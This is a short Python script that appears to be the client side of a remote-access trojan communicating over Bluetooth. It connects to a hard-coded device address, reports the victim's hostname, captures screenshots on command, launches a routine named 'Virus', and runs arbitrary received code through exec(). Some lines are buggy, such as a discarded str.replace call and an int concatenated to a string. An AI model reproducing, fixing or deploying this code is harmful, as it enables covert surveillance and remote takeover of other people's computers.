import socket
import ClientUI
import threading
import pyautogui
import os 

screeniecounter = 0
client = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
client.connect(("6c:2f:80:71:84:8b", 4))

client.send(socket.gethostname().encode())
th = threading.Thread(target=ClientUI.Virus,daemon=True)

ima = b""
try:
    while True:
        data = client.recv(9999)
        if not data:
            break
        
        print(isinstance(data, bytes))
        if isinstance(data, bytes):
            dec = data.decode()
            print(dec)
            if dec == "1":
                client.send(ClientUI.Connect().encode())
            elif dec == "2" and not th.is_alive():
                th.start()
            elif dec == "3":
                pyautogui.screenshot().save("Screenshot"+screeniecounter + ".png")
                screeniecounter = screeniecounter + 1
            elif "cmdmode:" in  dec:
                str.replace('cmdmode:', '')
                exec(dec)
        else:
            print(data)
    print("Update Window")
except OSError as e:
    pass

client.close()
if ClientUI.window and ClientUI.window.winfo_exists():
    ClientUI.window.quit()